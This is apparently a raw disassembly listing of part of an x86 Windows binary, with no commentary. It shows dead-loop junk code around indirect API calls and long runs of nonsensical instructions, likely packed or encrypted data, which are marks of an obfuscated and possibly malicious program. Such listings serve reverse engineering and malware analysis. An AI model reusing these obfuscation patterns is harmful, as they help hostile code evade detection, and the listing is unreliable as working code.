  406187:	clc    
  406188:	cs mov bh,0xe9
  40618b:	push   ds
  40618c:	stos   BYTE PTR es:[edi],al
  40618d:	test   BYTE PTR [esi],bl
  40618f:	push   ebx
  406190:	pop    eax
  406191:	mov    DWORD PTR [esi],eax
  406193:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406194:	push   ebx
  406195:	jmp    0x40715f
  40619a:	and    DWORD PTR ds:0x412370,0x0
  4061a4:	jmp    0x4061b6
  4061a9:	mov    edx,DWORD PTR ds:0x412370
  4061af:	inc    edx
  4061b0:	mov    DWORD PTR ds:0x412370,edx
  4061b6:	cmp    DWORD PTR ds:0x412370,0x1e
  4061bd:	jae    0x4061ea
  4061c3:	cmp    DWORD PTR ds:0x412370,0x2a
  4061ca:	jne    0x4061e3
  4061d0:	push   DWORD PTR [ebp-0x10]
  4061d3:	push   0x41acf1
  4061d8:	push   0x41ac28
  4061dd:	call   DWORD PTR ds:0x40d000
  4061e3:	jmp    0x4061a9
  4061e8:	adc    edi,edi
  4061ea:	mov    edx,DWORD PTR [ebp-0x8]
  4061ed:	mov    DWORD PTR ds:0x412364,0x11
  4061f7:	cmp    DWORD PTR ds:0x412364,0x0
  4061fe:	je     0x406239
  406204:	cmp    DWORD PTR ds:0x412364,0x14
  40620b:	jne    0x406227
  406211:	push   0x44a4
  406216:	push   DWORD PTR [ebp-0x20]
  406219:	push   0x788c
  40621e:	push   DWORD PTR [ebp-0x10]
  406221:	call   DWORD PTR ds:0x40d360
  406227:	mov    edi,DWORD PTR ds:0x412364
  40622d:	dec    edi
  40622e:	mov    DWORD PTR ds:0x412364,edi
  406234:	jmp    0x4061f7
  406239:	mov    edi,DWORD PTR [ebp-0x10]
  40623c:	or     DWORD PTR ds:0x41235c,0x6f22
  406246:	sub    edi,edx
  406248:	adc    DWORD PTR ds:0x4235c3,edi
  40624e:	mov    edx,DWORD PTR [ebp-0x4]
  406251:	adc    DWORD PTR ds:0x41abca,0x7639
  40625b:	xor    edx,eax
  40625d:	sbb    DWORD PTR ds:0x4235d3,0x415105
  406267:	add    edx,ecx
  406269:	mov    DWORD PTR ds:0x41abda,0x19aa
  406273:	cmp    edi,edx
  406275:	mov    DWORD PTR ds:0x4150fd,0x443e
  40627f:	jb     0x4072d5
  406285:	mov    edx,DWORD PTR [ebp-0x28]
  406288:	sbb    edi,0x1e1d
  40628e:	mov    edi,DWORD PTR [ebp-0x4]
  406291:	mov    ebx,DWORD PTR ds:0x417e45
  406297:	or     DWORD PTR ds:0x417e3d,ebx
  40629d:	xor    edx,eax
  40629f:	xor    edi,eax
  4062a1:	mov    DWORD PTR ds:0x417e55,0x5fc7
  4062ab:	add    edi,ecx
  4062ad:	dec    ebx
  4062ae:	add    edx,ecx
  4062b0:	dec    ebx
  4062b1:	imul   edx,edi
  4062b4:	sbb    DWORD PTR ds:0x41abe2,0x63fb
  4062be:	mov    edi,DWORD PTR [ebp-0x8]
  4062c1:	mov    DWORD PTR ds:0x41abd2,0x13
  4062cb:	cmp    DWORD PTR ds:0x41abd2,0x0
  4062d2:	je     0x406309
  4062d8:	cmp    DWORD PTR ds:0x41abd2,0x23
  4062df:	jne    0x4062f1
  4062e5:	push   DWORD PTR [ebp-0x18]
  4062e8:	push   DWORD PTR [ebp-0x24]
  4062eb:	call   DWORD PTR ds:0x40d364
  4062f1:	mov    ebx,DWORD PTR ds:0x41abd2
  4062f7:	dec    ebx
  4062f8:	mov    DWORD PTR ds:0x41abd2,ebx
  4062fe:	jmp    0x4062cb
  406303:	sbb    ebx,0x2ce7
  406309:	mov    ebx,DWORD PTR [ebp-0x10]
  40630c:	inc    DWORD PTR ds:0x41abce
  406312:	sub    ebx,edi
  406314:	mov    DWORD PTR ds:0x4235d7,0x7511
  40631e:	cmp    ebx,edx
  406320:	mov    DWORD PTR ds:0x41abd2,0x3d79
  40632a:	ja     0x40635a
  406330:	mov    edx,DWORD PTR [ebp-0x4]
  406333:	mov    DWORD PTR ds:0x412368,0x316e
  40633d:	xor    edx,eax
  40633f:	add    DWORD PTR ds:0x415109,0x4882
  406349:	add    edx,ecx
  40634b:	mov    DWORD PTR ds:0x417e59,0x234c
  406355:	jmp    0x40672b
  40635a:	mov    edx,DWORD PTR [ebp-0x2c]
  40635d:	sbb    DWORD PTR ds:0x412370,0x4f34
  406367:	mov    edi,DWORD PTR [ebp-0x4]
  40636a:	and    ebx,0x5352
  406370:	xor    edx,eax
  406372:	and    DWORD PTR ds:0x415111,0x0
  40637c:	jmp    0x40638e
  406381:	mov    ebx,DWORD PTR ds:0x415111
  406387:	inc    ebx
  406388:	mov    DWORD PTR ds:0x415111,ebx
  40638e:	cmp    DWORD PTR ds:0x415111,0x16
  406395:	jae    0x406508
  40639b:	cmp    DWORD PTR ds:0x415111,0x1c
  4063a2:	jne    0x4063b1
  4063a8:	push   DWORD PTR [ebp-0x1c]
  4063ab:	call   DWORD PTR ds:0x40d1d4
  4063b1:	jmp    0x406381
  4063b6:	jmp    0x406508
  4063bb:	add    eax,DWORD PTR [esi]
  4063bd:	mov    al,ds:0xf969b94b
  4063c2:	inc    esi
  4063c3:	popf   
  4063c4:	imul   ebp,DWORD PTR [ebx+0x6be2ef18],0x25
  4063cb:	jmp    0x7e7f:0x237e7e0c
  4063d2:	jle    0x4063fa
  4063d4:	mov    cl,0xf3
  4063d6:	(bad)  
  4063d7:	fadd   QWORD PTR [edi-0x49]
  4063da:	rcr    BYTE PTR [esi+0x79dce59b],1
  4063e0:	cli    
  4063e1:	leave  
  4063e2:	fnsave [ebx]
  4063e4:	clc    
  4063e5:	ja     0x4063fe
  4063e7:	xchg   ebx,eax
  4063e8:	pop    ss
  4063e9:	shl    BYTE PTR [ebp-0x3188052b],cl
  4063ef:	je     0x406466
  4063f1:	cdq    
  4063f2:	jb     0x406395
  4063f4:	aas    
  4063f5:	pushf  
  4063f6:	sbb    al,0xe0
  4063f8:	sub    BYTE PTR [eax+0x73b688c3],0x8a
  4063ff:	pop    edi
  406400:	dec    ebp
  406401:	push   ebx
  406402:	pop    esi
  406403:	leave  
  406404:	shl    BYTE PTR [edi-0x77de9cce],1
  40640a:	int3   
  40640b:	pop    esi
  40640c:	dec    ecx
  40640d:	push   eax
  40640e:	stos   BYTE PTR es:[edi],al
  40640f:	es jg  0x406462
  406412:	or     DWORD PTR [ecx+0xc5279ac],0x19
  406419:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40641a:	xchg   ebp,eax
  40641b:	cli    
  40641c:	fld    QWORD PTR [esi+0x25]
  40641f:	xor    BYTE PTR [edi+edx*4-0x68],dl
  406423:	and    BYTE PTR [edx],0x49
  406426:	sbb    al,0xf8
  406428:	xor    eax,0x2269a1bc
  40642d:	je     0x406464
  40642f:	sbb    ch,al
  406431:	jbe    0x406426
  406433:	push   es
  406434:	js     0x4064ad
  406436:	in     al,dx
  406437:	pop    ss
  406438:	sub    eax,0xc1f3552e
  40643d:	jnp    0x40646f
  40643f:	mov    edx,0xdb23686e
  406444:	push   esp
  406445:	adc    DWORD PTR [ecx+esi*1+0x6c],ecx
  406449:	dec    esi
  40644a:	sar    DWORD PTR [ebx],1
  40644c:	cld    
  40644d:	jae    0x4063e6
  40644f:	cmp    DWORD PTR [eax],eax
  406451:	lods   al,BYTE PTR ds:[esi]
  406452:	adc    eax,0x424cc4a7
  406457:	xor    edi,DWORD PTR [ebx+0x5c]
  40645a:	pop    ecx
  40645b:	push   esi
  40645c:	pop    DWORD PTR [edi+0x7e]
  40645f:	mov    dh,0xbd
  406461:	inc    ebx
  406462:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406463:	push   edi
  406464:	xchg   esi,eax
  406465:	cmp    ebp,DWORD PTR [esi+ebp*2]
  406468:	and    edi,DWORD PTR [edi+0x1f]
  40646b:	push   ebp
  40646c:	and    DWORD PTR [eax+ecx*4-0x5149d322],eax
  406473:	jle    0x40640f
  406475:	xor    DWORD PTR [esi],ecx
  406477:	outs   dx,DWORD PTR ds:[esi]
  406478:	clc    
  406479:	mov    dl,0xb5
  40647b:	and    al,0x9a
  40647d:	hlt    
  40647e:	ins    BYTE PTR es:[edi],dx
  40647f:	lock aam 0x44
  406482:	and    BYTE PTR [ebx+0x2b2c6340],ch
  406488:	retf   0xb365
  40648b:	(bad)  
  40648c:	pmuludq mm5,QWORD PTR [eax]
  40648f:	push   DWORD PTR [ebp+0x35083d64]
  406495:	imul   ecx,DWORD PTR [ecx],0xef9c75cd
  40649b:	xor    dl,BYTE PTR [ecx-0x7a0c99c0]
  4064a1:	leave  
  4064a2:	xor    eax,DWORD PTR [esi-0x69]
  4064a5:	push   edi
  4064a6:	mov    bh,0x9a
  4064a8:	pop    esp
  4064a9:	in     al,0x77
  4064ab:	retf   
  4064ac:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4064ad:	mov    bl,0x21
  4064af:	stos   DWORD PTR es:[edi],eax
  4064b0:	jo     0x406446
  4064b2:	sub    BYTE PTR ds:0x4d276dfd,0xb3
  4064b9:	pop    edi
  4064ba:	sbb    ah,BYTE PTR [edi+ecx*4]
  4064bd:	retf   
  4064be:	pop    ss
  4064bf:	xchg   edx,eax
  4064c0:	jge    0x406459
  4064c2:	or     bh,BYTE PTR [edi]
  4064c4:	aaa    
  4064c5:	jb     0x4064aa
  4064c7:	jmp    0x7e6:0x347d3ff7
  4064ce:	or     ecx,DWORD PTR [eax+0x5de5ed5]
  4064d4:	inc    ebp
  4064d5:	fcos   
  4064d7:	pop    ebx
  4064d8:	and    BYTE PTR [ebx+edi*4],0x51
  4064dc:	cwde   
  4064dd:	or     BYTE PTR [ebx+0x78ed77a1],ah
  4064e3:	inc    ecx
  4064e4:	das    
  4064e5:	xor    ebp,edi
  4064e7:	jb     0x406564
  4064e9:	sub    bh,ch
  4064eb:	faddp  st(1),st
  4064ed:	jmp    0xce04:0x68474ad5
  4064f4:	cmc    
  4064f5:	cmp    al,0xb8
  4064f7:	mov    edi,0xcf499db6
  4064fc:	imul   edx,DWORD PTR [bp+0xc],0x1381f667
  406504:	jb     0x40656e
  406506:	mul    DWORD PTR [ebx+esi*1]
  406509:	clc    
  40650a:	add    edi,ecx
  40650c:	add    edx,ecx
  40650e:	imul   edx,edi
  406511:	mov    edi,DWORD PTR [ebp-0x8]
  406514:	jmp    0x406666
  406519:	jbe    0x406527
  40651b:	xchg   ebp,eax
  40651c:	call   0xe08bdec6
  406521:	adc    DWORD PTR ds:0x90134057,edi
  406527:	sub    DWORD PTR [esi-0x61],ecx
  40652a:	or     eax,0x7f237e7e
  40652f:	jle    0x4065af
  406531:	or     DWORD PTR [edi+0x10],esp
  406534:	dec    ecx
  406535:	bound  ebx,QWORD PTR [esi-0x13f2e2c6]
  40653b:	test   eax,0x46913cff
  406540:	sbb    al,0xd0
  406542:	and    DWORD PTR ss:[edx+esi*4],edi
  406546:	mov    BYTE PTR ds:0x33d41f8d,bl
  40654c:	mov    al,ds:0xb06b6f7b
  406551:	nop
  406552:	xchg   edi,eax
  406553:	pop    ds
  406554:	sbb    ch,ah
  406556:	outs   dx,DWORD PTR ds:[esi]
  406557:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406558:	lea    esp,[ebx-0x74]
  40655b:	jecxz  0x4065bd
  40655d:	rol    BYTE PTR [ecx+0x51],1
  406560:	jle    0x40650b
  406562:	adc    al,0x52
  406564:	adc    al,0xbd
  406566:	xchg   ebp,eax
  406567:	arpl   bx,ax
  406569:	dec    ebp
  40656a:	xor    eax,0xd03fdce8
  40656f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406570:	mov    edi,DWORD PTR [edi]
  406572:	mov    al,0x8e
  406574:	xchg   DWORD PTR [ebx+0x79],ebx
  406577:	fcmovne st,st(7)
  406579:	sub    ah,BYTE PTR [ecx-0x2d]
  40657c:	cmp    eax,0xd64d15da
  406581:	jge    0x4065e3
  406583:	dec    ebx
  406584:	out    0x7a,eax
  406586:	xchg   esp,eax
  406587:	sub    eax,eax
  406589:	push   es
  40658a:	das    
  40658b:	cmp    DWORD PTR [edi-0x2106ce63],ebp
  406591:	leave  
  406592:	jecxz  0x4065a0
  406594:	mov    DWORD PTR [edx],esi
  406596:	adc    eax,0xe543775c
  40659b:	(bad)  
  40659c:	xlat   BYTE PTR ds:[ebx]
  40659d:	xor    ebx,edx
  40659f:	push   ss
  4065a0:	aam    0xac
  4065a2:	mov    ds:0xc8c186d7,eax
  4065a7:	std    
  4065a8:	retf   
  4065a9:	inc    esp
  4065aa:	fstp   QWORD PTR [edx-0x744a07c4]
  4065b0:	mov    ds:0x4b4cd02a,eax
  4065b5:	jecxz  0x406573
  4065b7:	jmp    0xcf24:0x581bd61b
  4065be:	das    
  4065bf:	sub    BYTE PTR [ecx+0x45],bh
  4065c2:	fdivp  st(2),st
  4065c4:	mov    cl,0xc6
  4065c6:	mov    BYTE PTR [edx+0x29474333],dl
  4065cc:	mov    bh,0x66
  4065ce:	call   0x1a7ee7f9
  4065d3:	pop    esi
  4065d4:	std    
  4065d5:	mov    eax,ds:0x7750a15c
  4065da:	lock push esi
  4065dc:	frstor [eax-0x1806ab24]
  4065e2:	push   eax
  4065e3:	inc    edi
  4065e4:	cli    
  4065e5:	(bad)  
  4065e7:	inc    edx
  4065e8:	test   BYTE PTR [esi+0x470cff47],bl
  4065ee:	ja     0x406664
  4065f0:	cmp    al,0xec
  4065f2:	or     ecx,DWORD PTR [edx-0x6d54a413]
  4065f8:	in     eax,dx
  4065f9:	scas   al,BYTE PTR es:[edi]
  4065fa:	mov    al,ds:0x80aa3037
  4065ff:	sar    dh,0x37
  406602:	pop    esp
  406603:	lods   al,BYTE PTR ds:[esi]
  406604:	cmp    BYTE PTR [edx-0x2eea1c41],cl
  40660a:	aas    
  40660b:	push   ss
  40660c:	dec    ebp
  40660d:	or     eax,0x5f3a8c13
  406612:	ds rcr esi,cl
  406615:	lea    ebx,[edi+0x349d6765]
  40661b:	js     0x40662f
  40661d:	icebp  
  40661e:	inc    eax
  40661f:	(bad)  
  406620:	idiv   DWORD PTR [esi]
  406622:	nop
  406623:	rcl    BYTE PTR ds:0xa0df465b,0xdd
  40662a:	int3   
  40662b:	call   0x6f0296b6
  406630:	inc    eax
  406631:	jmp    sp
  406634:	jle    0x40665a
  406636:	cmp    al,0xe1
  406638:	or     eax,0x12438c8f
  40663d:	sub    BYTE PTR [edx+0x4bafd564],bl
  406643:	sbb    BYTE PTR [ebp+eiz*4-0x37120d2c],al
  40664a:	xchg   BYTE PTR [edx-0xf3026f9],bh
  406650:	mov    edi,0x7f1a3ce5
  406655:	fwait
  406656:	xlat   BYTE PTR ds:[ebx]
  406657:	pop    ss
  406658:	out    dx,al
  406659:	xor    al,0xca
  40665b:	test   eax,0x83caadaf
  406660:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406661:	xor    eax,0xdd51ee32
  406666:	mov    ebx,DWORD PTR [ebp-0x10]
  406669:	sub    ebx,edi
  40666b:	cmp    ebx,edx
  40666d:	ja     0x40667b
  406673:	mov    edx,DWORD PTR [ebp-0x28]
  406676:	jmp    0x40671d
  40667b:	mov    edx,DWORD PTR [ebp-0x30]
  40667e:	mov    edi,DWORD PTR [ebp-0x4]
  406681:	xor    edx,eax
  406683:	xor    edi,eax
  406685:	add    edi,ecx
  406687:	add    edx,ecx
  406689:	imul   edx,edi
  40668c:	mov    edi,DWORD PTR [ebp-0x8]
  40668f:	mov    ebx,DWORD PTR [ebp-0x10]
  406692:	sub    ebx,edi
  406694:	cmp    ebx,edx
  406696:	ja     0x4066a4
  40669c:	mov    edx,DWORD PTR [ebp-0x2c]
  40669f:	jmp    0x40671d
  4066a4:	mov    edx,DWORD PTR [ebp-0x34]
  4066a7:	mov    edi,DWORD PTR [ebp-0x4]
  4066aa:	xor    edx,eax
  4066ac:	xor    edi,eax
  4066ae:	add    edi,ecx
  4066b0:	add    edx,ecx
  4066b2:	imul   edx,edi
  4066b5:	mov    edi,DWORD PTR [ebp-0x8]
  4066b8:	mov    ebx,DWORD PTR [ebp-0x10]
  4066bb:	sub    ebx,edi
  4066bd:	cmp    ebx,edx
  4066bf:	ja     0x4066cd
  4066c5:	mov    edx,DWORD PTR [ebp-0x30]
  4066c8:	jmp    0x40671d
  4066cd:	mov    edx,DWORD PTR [ebp-0x38]
  4066d0:	mov    edi,DWORD PTR [ebp-0x4]
  4066d3:	xor    edx,eax
  4066d5:	xor    edi,eax
  4066d7:	add    edi,ecx
  4066d9:	add    edx,ecx
  4066db:	imul   edx,edi
  4066de:	mov    edi,DWORD PTR [ebp-0x8]
  4066e1:	mov    ebx,DWORD PTR [ebp-0x10]
  4066e4:	sub    ebx,edi
  4066e6:	cmp    ebx,edx
  4066e8:	ja     0x4066f6
  4066ee:	mov    edx,DWORD PTR [ebp-0x34]
  4066f1:	jmp    0x40671d
  4066f6:	mov    edx,DWORD PTR [ebp-0x3c]
  4066f9:	mov    edi,DWORD PTR [ebp-0x4]
  4066fc:	xor    edx,eax
  4066fe:	xor    edi,eax
  406700:	add    edx,ecx
  406702:	add    edi,ecx
  406704:	imul   edx,edi
  406707:	mov    edi,DWORD PTR [ebp-0x8]
  40670a:	mov    ebx,DWORD PTR [ebp-0x10]
  40670d:	sub    ebx,edi
  40670f:	cmp    ebx,edx
  406711:	mov    edx,DWORD PTR [ebp-0x38]
  406714:	jbe    0x40671d
  40671a:	mov    edx,DWORD PTR [ebp-0x3c]
  40671d:	mov    edi,DWORD PTR [ebp-0x4]
  406720:	xor    edi,eax
  406722:	xor    edx,eax
  406724:	add    edi,ecx
  406726:	add    edx,ecx
  406728:	imul   edx,edi
  40672b:	mov    DWORD PTR [ebp+0xc],edx
  40672e:	mov    edx,DWORD PTR [ebp+0xc]
  406731:	mov    DWORD PTR [ebp-0x24],edx
  406734:	mov    edx,DWORD PTR [ebp-0x8]
  406737:	jmp    0x406889
  40673c:	lock cs xchg ebx,eax
  40673f:	xchg   esi,eax
  406740:	mov    eax,ds:0xd53889bb
  406745:	and    esp,DWORD PTR [ebp+0x1b]
  406748:	sbb    DWORD PTR cs:[edi-0x2f],ebx
  40674c:	inc    eax
  40674d:	add    bh,BYTE PTR [esi+0x7e]
  406750:	and    edi,DWORD PTR [edi+0x7e]
  406753:	jle    0x4066d6
  406755:	mov    ds:0xe3131296,eax
  40675a:	mov    cl,0x6
  40675c:	mov    ds:0x86e49522,al
  406761:	(bad)  
  406762:	loop   0x406799
  406764:	test   BYTE PTR [esi+0x33637447],al
  40676a:	mov    ebp,0x703cab83
  40676f:	adc    ah,dl
  406771:	inc    eax
  406772:	xchg   esp,eax
  406773:	aaa    
  406774:	and    DWORD PTR [ebp+0x15],esi
  406777:	mov    edi,0xdaa65dc0
  40677c:	ds inc ebp
  40677e:	neg    ah
  406780:	fld    TBYTE PTR [eax+0x5f]
  406783:	jle    0x406749
  406785:	mov    bh,0xf3
  406787:	popa   
  406788:	push   cs
  406789:	add    eax,0x9950e7a2
  40678e:	mov    cl,0xa1
  406790:	repnz add BYTE PTR [edx-0x49],0x71
  406795:	add    BYTE PTR [edx+0x354f9d01],ch
  40679b:	in     eax,dx
  40679c:	inc    esi
  40679d:	into   
  40679e:	loope  0x406785
  4067a0:	xor    al,dh
  4067a2:	repnz pop edx
  4067a4:	js     0x40673d
  4067a6:	push   ebx
  4067a7:	push   edx
  4067a8:	push   DWORD PTR [eax+0x75fa56b9]
  4067ae:	pop    ecx
  4067af:	push   ebp
  4067b0:	loop   0x406812
  4067b2:	out    dx,eax
  4067b3:	push   ebp
  4067b4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4067b5:	call   0xb4fe658b
  4067ba:	sub    al,0xb6
  4067bc:	dec    ecx
  4067bd:	cs loop 0x40675b
  4067c0:	mov    edx,0xf770314
  4067c5:	jae    0x4067d1
  4067c7:	aas    
  4067c8:	pop    DWORD PTR [ebp+0x12]
  4067cb:	jg     0x40677a
  4067cd:	adc    DWORD PTR [edx+0x54],ecx
  4067d0:	jne    0x406817
  4067d2:	arpl   bp,dx
  4067d4:	mov    dh,BYTE PTR [ebx]
  4067d6:	shr    DWORD PTR [edi],cl
  4067d8:	dec    eax
  4067d9:	mov    dh,0x86
  4067db:	push   ds
  4067dc:	xor    ebx,ebx
  4067de:	add    al,0x22
  4067e0:	inc    esp
  4067e1:	jnp    0x406772
  4067e3:	sub    BYTE PTR [edi-0x4a96f746],al
  4067e9:	call   0x96b5:0x2bc4ed4b
  4067f0:	dec    edx
  4067f1:	xlat   BYTE PTR ds:[ebx]
  4067f2:	(bad)  
  4067f4:	ret    0xb1f4
  4067f7:	jno    0x4067ff
  4067f9:	adc    eax,DWORD PTR [edx]
  4067fb:	ss adc ecx,ebx
  4067fe:	cmp    esi,eax
  406800:	loope  0x4067e0
  406802:	jbe    0x4067b6
  406804:	jmp    0x4f1c:0x5c1a94af
  40680b:	test   BYTE PTR [ebp-0x3423a958],dh
  406811:	pop    eax
  406812:	jae    0x4067ba
  406814:	mov    esp,DWORD PTR [ebx]
  406816:	ror    DWORD PTR [ecx-0x4d299945],0x8b
  40681d:	xor    DWORD PTR [esi-0x8],ebp
  406820:	in     eax,dx
  406821:	scas   eax,DWORD PTR es:[edi]
  406822:	cmp    esi,eax
  406824:	push   edi
  406825:	jecxz  0x406858
  406827:	in     al,dx
  406828:	rcr    DWORD PTR [ebx-0x53],1
  40682b:	cmp    DWORD PTR [esi],edx
  40682d:	xlat   BYTE PTR ds:[ebx]
  40682e:	leave  
  40682f:	inc    ebx
  406830:	imul   edx,DWORD PTR [edx],0x76894448
  406836:	or     ebp,ebx
  406838:	jg     0x4067f7
  40683a:	shl    DWORD PTR [edi-0x6d],1
  40683d:	imul   esi,DWORD PTR [edi+0x67],0x69787491
  406844:	popf   
  406845:	loope  0x40680b
  406847:	and    ebp,ebx
  406849:	addr16 (bad) 
  40684c:	push   es
  40684d:	push   cs
  40684e:	add    edx,DWORD PTR [edi]
  406850:	mov    ebx,0x4948f54f
  406855:	outs   dx,DWORD PTR ds:[esi]
  406856:	push   ds
  406857:	cli    
  406858:	cmp    dh,BYTE PTR [edx+0x6b]
  40685b:	pop    edx
  40685c:	mov    cl,0x3c
  40685e:	adc    ah,BYTE PTR ds:0xa671bb7a
  406864:	loop   0x4068d7
  406866:	jb     0x4068c9
  406868:	lds    ebx,FWORD PTR [edi]
  40686a:	dec    ecx
  40686b:	pop    es
  40686c:	jno    0x4068d1
  40686e:	mov    ebx,DWORD PTR [edi+0x47f7b5ca]
  406874:	fst    DWORD PTR [ebp+0x48318b53]
  40687a:	mov    ah,0x47
  40687c:	sbb    al,0x31
  40687e:	mov    cl,0xcf
  406880:	popf   
  406881:	test   BYTE PTR [eax],ch
  406883:	sbb    ebx,DWORD PTR [ebx+0x4a3caa87]
  406889:	add    edx,DWORD PTR [ebp-0x40]
  40688c:	mov    DWORD PTR [ebp-0x18],0xf89c8538
  406893:	mov    DWORD PTR [ebp-0x1c],edx
  406896:	mov    DWORD PTR [ebp-0xc],0xf89c853b
  40689d:	mov    DWORD PTR [ebp-0x44],0xf89c853a
  4068a4:	mov    edx,DWORD PTR [ebp-0x18]
  4068a7:	jmp    0x4069f9
  4068ac:	daa    
  4068ad:	mov    ecx,0x7980c50e
  4068b2:	in     eax,0x79
  4068b4:	dec    ebp
  4068b5:	push   esp
  4068b6:	push   ecx
  4068b7:	cmp    al,0xd8
  4068b9:	pop    esi
  4068ba:	dec    ebp
  4068bb:	inc    edx
  4068bc:	jne    0x4068be
  4068be:	jle    0x40693e
  4068c0:	and    edi,DWORD PTR [edi+0x7e]
  4068c3:	jle    0x4068d2
  4068c5:	rep stos BYTE PTR es:[edi],al
  4068c7:	jmp    0x4068cf
  4068c9:	lds    ebp,FWORD PTR [edx-0x13]
  4068cc:	rol    BYTE PTR [esi+0x6c060a85],0x1d
  4068d3:	inc    eax
  4068d4:	jl     0x4068cb
  4068d6:	adc    eax,0x53198392
  4068db:	adc    DWORD PTR [edx-0x4081993b],0x608ae0c
  4068e5:	hlt    
  4068e6:	push   ds
  4068e7:	(bad)  
  4068e8:	mov    es,ebp
  4068ea:	sbb    DWORD PTR [esi+0x288039b2],eax
  4068f0:	pop    es
  4068f1:	mov    edi,0x7cadea40
  4068f6:	or     eax,0xa2743708
  4068fb:	je     0x4068fb
  4068fd:	dec    edi
  4068fe:	jne    0x40695d
  406900:	lods   al,BYTE PTR ds:[esi]
  406901:	fst    QWORD PTR [eax+0xf]
  406904:	lods   eax,DWORD PTR ds:[esi]
  406905:	mov    ds:0xf37963ca,al
  40690a:	test   BYTE PTR ds:0x19416120,ch
  406910:	cmp    DWORD PTR [edx+0x1d591acc],0xa7d799b6
  40691a:	adc    eax,0x5ab2bc59
  40691f:	das    
  406920:	into   
  406921:	idiv   DWORD PTR [ebx-0x496ca4a3]
  406927:	push   0x2dd39cad
  40692c:	xchg   edx,eax
  40692d:	and    cl,0xb9
  406930:	push   esi
  406931:	(bad)  
  406932:	push   esi
  406933:	add    dh,BYTE PTR [edi-0xdba7763]
  406939:	ret    0x13cd
  40693c:	mov    cl,0xbd
  40693e:	jbe    0x4068d7
  406940:	push   ss
  406941:	push   esp
  406942:	dec    ebx
  406943:	or     BYTE PTR [esi-0x4b6cd720],0x46
  40694a:	fwait
  40694b:	ret    
  40694c:	out    dx,al
  40694d:	dec    edi
  40694e:	lahf   
  40694f:	cwde   
  406950:	push   esi
  406951:	and    al,0x2a
  406953:	mov    esp,0x64146248
  406958:	into   
  406959:	loope  0x406919
  40695b:	ja     0x4069ce
  40695d:	jbe    0x4069dc
  40695f:	loopne 0x4069c2
  406961:	mov    BYTE PTR [edi-0x6a],bl
  406964:	aas    
  406965:	dec    eax
  406966:	push   esp
  406967:	mov    al,0xda
  406969:	mov    ebp,0xd1d6d9bf
  40696e:	pop    eax
  40696f:	(bad)  
  406971:	mov    esp,0xac039a5b
  406976:	cmp    dh,BYTE PTR [edi+ebx*2+0x2f]
  40697a:	popa   
  40697b:	popa   
  40697c:	xchg   ebp,eax
  40697d:	out    0xd5,eax
  40697f:	(bad)  [edx+0x24]
  406982:	test   BYTE PTR [ebp-0x3affc117],0x9a
  406989:	ins    DWORD PTR es:[edi],dx
  40698a:	jmp    FWORD PTR [ebx-0x2a982221]
  406990:	or     edi,DWORD PTR [ebp-0x4816ab5]
  406996:	les    ebx,FWORD PTR [ecx-0x34d3e8ff]
  40699c:	adc    BYTE PTR [eax+0x6bec247b],al
  4069a2:	dec    ecx
  4069a3:	push   ecx
  4069a4:	dec    esi
  4069a5:	in     eax,0x4a
  4069a7:	arpl   WORD PTR [eax+0x4cccfaa6],ax
  4069ad:	fild   QWORD PTR [eax-0x5299cce7]
  4069b3:	pushf  
  4069b4:	sub    al,0x94
  4069b6:	push   ds
  4069b7:	inc    ebp
  4069b8:	sbb    BYTE PTR [edi-0x489b0dad],bh
  4069be:	jbe    0x4069b5
  4069c0:	cmp    esi,esp
  4069c2:	xchg   ebx,eax
  4069c3:	and    DWORD PTR [edi+ebp*4],edx
  4069c6:	leave  
  4069c7:	es jnp 0x4069ea
  4069ca:	add    al,ah
  4069cc:	aad    0x36
  4069ce:	popf   
  4069cf:	or     ebp,ebx
  4069d1:	jmp    0x406a4f
  4069d3:	fsubp  st(0),st
  4069d5:	add    edi,edi
  4069d7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4069d8:	mov    ah,0xa6
  4069da:	pop    es
  4069db:	jge    0x406a46
  4069dd:	sbb    eax,0x7dd62d5c
  4069e2:	and    al,0xb7
  4069e4:	les    esi,FWORD PTR [ecx]
  4069e6:	(bad)  
  4069e8:	call   0x8bc557e4
  4069ed:	stos   BYTE PTR es:[edi],al
  4069ee:	sbb    dl,BYTE PTR [esp+eiz*2]
  4069f1:	icebp  
  4069f2:	mov    ds,WORD PTR [eax-0x23703ed2]
  4069f8:	fnstenv [ebx]
  4069fa:	shr    cl,1
  4069fc:	dec    ebp
  4069fd:	add    DWORD PTR [eax],eax
  4069ff:	add    ch,cl
  406a01:	sti    
  406a02:	mov    ebx,0x65b3b933
  406a07:	stc    
  406a08:	repnz add eax,0x41e27a93
  406a0e:	les    edi,FWORD PTR [edi]
  406a10:	add    DWORD PTR ds:[esi+0x7e],edi
  406a14:	and    edi,DWORD PTR [edi+0x7e]
  406a17:	jle    0x4069a4
  406a19:	inc    edi
  406a1a:	dec    ebp
  406a1b:	test   al,0x17
  406a1d:	push   eax
  406a1e:	imul   DWORD PTR [ebx+0x7c]
  406a21:	jl     0x4069c7
  406a23:	dec    eax
  406a24:	push   cs
  406a25:	xchg   edi,eax
  406a26:	pushf  
  406a27:	mov    al,0x5f
  406a29:	shl    DWORD PTR [edx],cl
  406a2b:	and    eax,0xaf83a773
  406a30:	mov    al,0x1a
  406a32:	jg     0x406aa0
  406a34:	xchg   esi,eax
  406a35:	jmp    0x58bdb645
  406a3a:	xchg   DWORD PTR [ebp-0x7bacb0f2],edi
  406a40:	or     al,BYTE PTR [esp+esi*4]
  406a43:	ret    0x9773
  406a46:	add    BYTE PTR [eax+0x0],dl
  406a49:	cmp    eax,0x6fe3cd07
  406a4e:	data16 int 0x58
  406a51:	add    DWORD PTR [edx+0x60a28479],esi
  406a57:	or     eax,0x6f974de8
  406a5c:	sub    al,0x66
  406a5e:	jae    0x406a6c
  406a60:	sub    al,0x99
  406a62:	out    0xaa,al
  406a64:	xor    eax,0xe7171553
  406a69:	and    DWORD PTR [eax],0x3d5c23ee
  406a6f:	ret    0x3484
  406a72:	push   edx
  406a73:	sahf   
  406a74:	sub    ecx,edx
  406a76:	mov    bl,0x6b
  406a78:	aam    0xb5
